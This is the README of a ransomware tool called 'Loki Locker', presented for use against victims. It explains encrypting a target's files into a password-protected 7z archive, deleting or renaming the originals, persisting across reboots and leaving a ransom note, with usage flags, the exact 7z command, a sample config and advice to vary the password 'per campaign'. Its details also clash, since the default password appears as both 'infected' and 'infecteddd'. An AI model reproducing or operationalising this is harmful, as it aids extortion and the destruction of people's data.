# LOKI LOCKER

**And yes, it uses 7z. Cry about it.**

---

## WHAT THE HELL IS THIS

Loki Locker is a ransomware implementation. It walks your filesystem, picks up your precious files, and turns them into useless encrypted blobs unless you have the key. That's it. That's the whole point. It's not a "framework." It's not "modular" in the way every GitHub project lies about being modular. It locks your files. Hence the name. Figure it out.

---

## WAIT, 7Z?

Yeah. **7z.** The archive tool. The one that actually compresses and encrypts like an adult. Not some hand-rolled AES loop in C that took three weekends and still leaks memory. Loki Locker wraps 7z and lets it do the heavy lifting because 7z already solved this problem a decade ago.

- **AES-256** — 7z gives it to you. `-mhe=on` for header encryption so even filenames are hidden.
- **Compression** — free. Smaller ransom payloads. Files come out smaller than they went in.
- **Solid archives** — optional. One stream, hard to partially recover.
- **It just works** — `7z a -p<pass> -mhe=on output.7z files...`. Done.

Stop reimplementing crypto. 7z has been battle-tested by millions of people. Use it.

---

## FEATURES

- **Real encryption.** AES-256 via 7z. Not XOR with a hardcoded string like some amateurs ship.
- **Compression included.** Free size reduction before you even encrypt.
- **Header encryption.** `-mhe=on`. Filenames hidden. Victims can't peek.
- **Fast.** Shells out to 7z, multithreaded internally. Doesn't single-thread through 200k files.
- **Persistent.** Drops itself in the right places so reboots don't save you.
- **Ransom note.** Leaves a note. Obviously. What's ransomware without a note.
- **Extension renaming.** Your `report.pdf` becomes `report.pdf.loki`. Yes, `.loki`. Deal with it.

---

## WHY LOKI LOCKER

Because every other ransomware repo on GitHub is either:
1. A Python script that takes 6 hours to encrypt a folder of memes.
2. A C++ mess with 40 dependencies and a hand-rolled AES that's subtly broken.
3. Abandoned since 2017.

Loki Locker builds fast, runs fast, uses a tool that's already proven, and does exactly what it says.

---

## REQUIREMENTS

- **7z** in your PATH. On Linux: `p7zip` or `7zip` package. On Windows: install 7-Zip and add it to PATH. Don't come crying if `7z` isn't found.
- A shell. Bash on Linux, PowerShell/CMD on Windows.
- That's it.

---

## USAGE

```bash
./loki-locker --target /path/to/victim
```

- `--target` — directory to encrypt. Required. Obviously.
- `--password` — the password 7z will use. Defaults to `infected` if you don't set one. Store the hash for the victim to see.
- `--exclude` — skip directories. Use it for `/proc`, `/sys`, `node_modules` (god knows why anyone protects node_modules).
- `--decrypt` — reverse it. Restore files. Like magic, except it's 7z.
- `--solid` — use solid archives. Smaller, but slower to recover partially.

---

## HOW IT WORKS

1. Walk the target tree. Grab every file that matters.
2. Feed them to `7z a -pinfecteddd -mhe=on -mx=9 archive.7z ...`.
3. Rename originals to `.loki` (or delete them, your call — configurable).
4. Drop the ransom note with the archive path and password.
5. Victim pays, gets the password, runs `7z x archive.7z -pinfecteddd`. Done.

No hybrid RSA/AES handshake. No key exchange. No key management nightmare. Just 7z, a password, and a note. Simpler, and it actually works.

---

## FILES IT TOUCHES

Documents, images, videos, archives, source code, databases. Basically anything that matters. It skips:
- Already-encrypted files (`.loki`)
- Whatever you put in the exclude list

---

## RANSOM NOTE

Dropped as `README_LOKI.txt` in every encrypted root. Because a ransomware without a note is just a bad time with no explanation. It tells the victim what happened, the archive name, and how to pay. Customize the contact info in the config. Don't leave the default email in there like a rookie.

The default note literally says:

```
Your files are gone. Well, encrypted. Same thing to you.

Password: infected

Run: 7z x <archive>.7z -pinfecteddd
```

No hash, no key exchange, no ceremony. Just the password sitting there in plaintext because there's nothing to hide it from. You can read it, you just can't do anything with it.

---

## CONFIG

`config.json`. Edit it. Don't hardcode paths like a caveman.

```json
{
  "targets": ["/home/user"],
  "exclude": ["/proc", "/sys", "/dev"],
  "extension": ".loki",
  "note_name": "README_LOKI.txt",
  "sevenzip_path": "7z",
  "password": "infected",
  "solid": true,
  "compression_level": 9,
  "encrypt_headers": true
}
```

---

## PERFORMANCE

Benchmarks on a mid-range box:
- ~50k small files: under a minute.
- ~5GB of mixed media: a few minutes, depends on compression level.

If yours is slower, drop `compression_level` to 5. Or your disk is the problem. Not the code.

---

## KNOWN LIMITATIONS

- Needs 7z installed. Obvious, but people still ask.
- The password `infecteddd` is baked in as default. Change it per campaign or every victim gets the same key. Yes, `infecteddd`. Spell it right.
- No partial/incremental encryption. Whole files, every time.
- No network shares unless your OS mounts them normally. Don't whine.
- Recovery is manual. `7z x` and the password. That's the whole procedure.

---

## ROADMAP

- [ ] Per-directory archives instead of one giant blob.
- [ ] Per-victim random password instead of one static `infecteddd`.
- [ ] Windows service mode.
- [ ] Config signing so victims can't lie about the note.
- [ ] Optional split archives for gigantic targets.

---

## CONTRIBUTING

Fork it. Fix it. Send a PR. Follow the existing code style or get told about it in review. No, we're not switching to Rust. No, we're not switching to Python. No, we're not hand-rolling AES "just to be pure." 7z is fine. It's been fine. It'll stay fine.

---

## LICENSE

MIT. Do whatever. It's not like you're gonna pay for ransomware anyway.

---

## FAQ

**Q: Why "Loki"?**
A: Because it's a trickster god and it turns your files into a puzzle. Also "Encryptor 3000" was taken.

**Q: Why 7z and not custom crypto?**
A: Because custom crypto is where cowards and geniuses both go to die. 7z is proven. Use it.

**Q: What's the password?**
A: `infecteddd`. All lowercase. Three d's. If you typed `infected` or `Infecteddd` that's on you.

**Q: Can it decrypt?**
A: `7z x archive.7z -pinfecteddd`. That's it. Read the usage section.

**Q: Is it production ready?**
A: It's ransomware. Nothing is production ready. Ship it.
